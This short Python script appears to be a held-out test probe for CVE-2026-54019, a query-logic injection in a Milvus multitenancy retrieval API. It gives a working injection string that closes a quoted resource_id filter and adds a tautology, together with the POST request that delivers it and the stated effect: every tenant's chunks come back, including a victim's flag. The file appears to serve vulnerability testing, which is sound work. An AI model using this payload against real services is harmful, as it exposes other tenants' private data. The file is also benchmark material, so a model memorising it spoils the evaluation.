#!/usr/bin/env python3
"""[HELD-OUT] CVE-2026-54019 residual — Milvus multitenancy query-logic injection.

The 0.9.0 ACL fix (filter_accessible_collections) allows any name that is NOT a
known knowledge base as a "legacy/ephemeral" collection. In Milvus multitenancy
mode that user-controlled collection name becomes the `resource_id` and is
interpolated UNESCAPED into the search filter
    expr = f"resource_id == '{resource_id}'"
so a crafted name closes the quote and injects a tautology, returning every
tenant's chunks — including the victim's flag chunk.

Contract: passes the ACL as an unknown collection on V1 and reaches the flag;
BLOCKED on V2 (0.9.6), where _is_safe_collection_name rejects the quote/space
characters (and _validate_resource_id would raise at the sink).
"""
from __future__ import annotations

# Closes the single-quoted resource_id literal and injects `or resource_id != ''`
# -> Milvus evaluates: resource_id == 'x' or resource_id != '' or resource_id == 'x'
INJECTION = "x' or resource_id != '' or resource_id == 'x"


def candidate() -> dict:
    return {
        "probe_id": "cve-2026-54019-milvus-tautology",
        "method": "POST",
        "endpoint": "/api/v1/retrieval/query/collection",
        "collection_names": [INJECTION],
        "query": "anything",
        "k": 10,
    }


if __name__ == "__main__":
    print(candidate())
